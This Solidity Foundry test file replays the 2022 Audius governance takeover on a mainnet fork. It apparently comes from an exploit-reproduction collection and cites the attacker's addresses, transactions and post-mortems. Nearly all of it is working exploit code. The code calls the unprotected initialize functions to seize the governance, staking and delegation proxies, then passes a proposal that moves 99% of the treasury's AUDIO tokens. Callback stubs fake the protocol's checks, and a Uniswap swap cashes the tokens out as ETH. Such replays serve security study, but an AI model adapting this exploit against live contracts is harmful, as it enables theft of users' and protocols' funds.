// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 704 ETH (~ 1,080,000 US$)
// Attacker : 0xa0c7bd318d69424603cbf91e9969870f21b8ab4c
// AttackContract : 0xbdbb5945f252bc3466a319cdcc3ee8056bf2e569
// Tx1 initialize + ProposalSubmitted + Staked :  https://etherscan.io/tx/0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984
// Tx2 submitVote : https://etherscan.io/tx/0x3c09c6306b67737227edc24c663462d870e7c2bf39e9ab66877a980c900dd5d5
// Tx3 evaluateProposal : https://etherscan.io/tx/0x4227bca8ed4b8915c7eec0e14ad3748a88c4371d4176e716e8007249b9980dc9
// Tx4 AUDIO/WETH Swap : https://etherscan.io/tx/0x82fc23992c7433fffad0e28a1b8d11211dc4377de83e88088d79f24f4a3f28b3

// @Info
// Governance Contract (Proxy) : https://etherscan.io/address/0x4deca517d6817b6510798b7328f2314d3003abac#code
// Governance Contract (Logic) : https://etherscan.io/address/0x1c91af03a390b4c619b444425b3119e553b5b44b#code
// Stacking Contract (Proxy) : https://etherscan.io/address/0xe6d97b2099f142513be7a2a068be040656ae4591#code
// Stacking Contract (Logic) : https://etherscan.io/address/0xea10fd3536fce6a5d40d55c790b96df33b26702f#code
// DelegateManagerV2 (Proxy) : https://etherscan.io/address/0x4d7968ebfd390d5e7926cb3587c39eff2f9fb225#code
// DelegateManagerV2 (Logic) : https://etherscan.io/address/0xf24aeab628493f82742db68596b532ab8a141057#code
// UniswapV2 Router 2 : https://etherscan.io/address/0x7a250d5630b4cf539739df2c5dacb4c659f2488d#code

// @NewsTrack
// Official Announcement : https://twitter.com/AudiusProject/status/1551000725169180672
// Official Post-Mortem : https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
// SunSec : https://twitter.com/1nf0s3cpt/status/1551050841146400768
// Abmedia News : https://abmedia.io/20220724-audius-hacked-by-mal-governance-proposal
// Beosin Alert : https://twitter.com/BeosinAlert/status/1551041795735408641
// CertiK Alert : https://twitter.com/CertiKAlert/status/1551020421532770305
// MistTrack : https://twitter.com/MistTrack_io/status/1551204726661734400

CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant attacker = 0xa0c7BD318D69424603CBf91e9969870F21B8ab4c;
address constant AUDIO = 0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998;
address payable constant uniswap = payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
address constant governance = 0x4DEcA517D6817B6510798b7328F2314d3003AbAC;
address constant staking = 0xe6D97B2099F142513be7A2a068bE040656Ae4591;
address constant delegatemanager = 0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225;

interface IGovernence {
    enum Vote {
        None,
        No,
        Yes
    }
    enum Outcome {
        InProgress,
        Rejected,
        ApprovedExecuted,
        QuorumNotMet,
        ApprovedExecutionFailed,
        Evaluating,
        Vetoed,
        TargetContractAddressChanged,
        TargetContractCodeHashChanged
    }

    function initialize(
        address _registryAddress,
        uint256 _votingPeriod,
        uint256 _executionDelay,
        uint256 _votingQuorumPercent,
        uint16 _maxInProgressProposals,
        address _guardianAddress
    ) external;
    function evaluateProposalOutcome(uint256 _proposalId) external returns (Outcome);
    function submitProposal(
        bytes32 _targetContractRegistryKey,
        uint256 _callValue,
        string calldata _functionSignature,
        bytes calldata _callData,
        string calldata _name,
        string calldata _description
    ) external returns (uint256);
    function submitVote(uint256 _proposalId, Vote _vote) external;
}

interface IStaking {
    function initialize(address _tokenAddress, address _governanceAddress) external;
}

interface IDelegateManagerV2 {
    function initialize(
        address _tokenAddress,
        address _governanceAddress,
        uint256 _undelegateLockupDuration
    ) external;
    function setServiceProviderFactoryAddress(address _spFactory) external;
    function delegateStake(address _targetSP, uint256 _amount) external returns (uint256);
}

/* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */
contract AttackContract is Test {
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_201_793); // Fork mainnet at block 15201793
        cheat.label(AUDIO, "AUDIO");
        cheat.label(uniswap, "UniswapV2Router02");
        cheat.label(governance, "GovernanceProxy");
        cheat.label(staking, "Stacking");
        cheat.label(delegatemanager, "DelegateManagerV2");
    }

    function testExploit() public {
        console.log("---------- Start from Block %s ----------", block.number);
        emit log_named_decimal_uint("Attacker ETH Balance", attacker.balance, 18);

        console.log("-------------------- Tx1 --------------------");
        console.log("Modify configurations...");
        console.log("-> votingPeriod : 3 blocks");
        console.log("-> executionDelay : 0 block");
        console.log("-> guardianAddress : self");
        // function initialize(
        // address _registryAddress,
        // uint256 _votingPeriod,
        // uint256 _executionDelay,
        // uint256 _votingQuorumPercent,
        // uint16 _maxInProgressProposals,
        // address _guardianAddress
        // )
        IGovernence(governance).initialize(address(this), 3, 0, 1, 4, address(this));

        console.log("Evaluate Proposal..."); // this is to make sure one can submit new proposals
        IGovernence(governance).evaluateProposalOutcome(84); // callback this.getContract()

        uint256 audioBalance_gov = IERC20(AUDIO).balanceOf(governance);
        uint256 stealAmount = audioBalance_gov * 99 / 1e2; // Steal 99% of AUDIO Token from governance address

        console.log("Submit Proposal...");
        // function submitProposal(
        //     bytes32 _targetContractRegistryKey,
        //     uint256 _callValue,
        //     string calldata _functionSignature,
        //     bytes calldata _callData,
        //     string calldata _name,
        //     string calldata _description
        // ) external returns (uint256)
        IGovernence(governance).submitProposal(
            bytes32(uint256(3078)),
            0,
            "transfer(address,uint256)",
            abi.encode(address(this), stealAmount),
            "Hello",
            "World"
        );

        IStaking(staking).initialize(address(this), address(this));
        IDelegateManagerV2(delegatemanager).initialize(address(this), address(this), 1);
        IDelegateManagerV2(delegatemanager).setServiceProviderFactoryAddress(address(this));
        IDelegateManagerV2(delegatemanager).delegateStake(address(this), 1e31);

        console.log("-------------------- Tx2 --------------------");
        console.log("SubmitVote `Yes` for malicious ProposalId 85...");
        cheat.roll(15_201_795);
        IGovernence(governance).submitVote(85, IGovernence.Vote(2)); // Voting Yes

        console.log("-------------------- Tx3 --------------------");
        console.log("Execute malicious ProposalId 85...");
        cheat.roll(15_201_798);
        IGovernence(governance).evaluateProposalOutcome(85); // callback this.getContract()
        uint256 audioBalance_this = IERC20(AUDIO).balanceOf(address(this));
        emit log_named_decimal_uint("AttackContract AUDIO Balance", audioBalance_this, 18);

        console.log("-------------------- Tx4 --------------------");
        console.log("AUDIO/ETH Swap...");
        address[] memory path = new address[](2);
        path[0] = AUDIO;
        path[1] = weth;
        IERC20(AUDIO).approve(uniswap, 1e40);
        IUniswapV2Router(uniswap).swapExactTokensForETH(audioBalance_this, 680 ether, path, attacker, block.timestamp);

        console.log("-------------------- End --------------------");
        emit log_named_decimal_uint("Attacker ETH Balance", attacker.balance, 18);
    }

    /* Tx1 callback functions */
    function getContract(bytes32 _targetContractRegistryKey) external returns (address) {
        return AUDIO;
    }

    function isGovernanceAddress() external view returns (bool) {
        return true;
    }

    function getExecutionDelay() external view returns (uint256) {
        return 0;
    }

    function getVotingPeriod() external view returns (uint256) {
        return 0;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function validateAccountStakeBalance(address) external pure {}

    receive() external payable {}
}
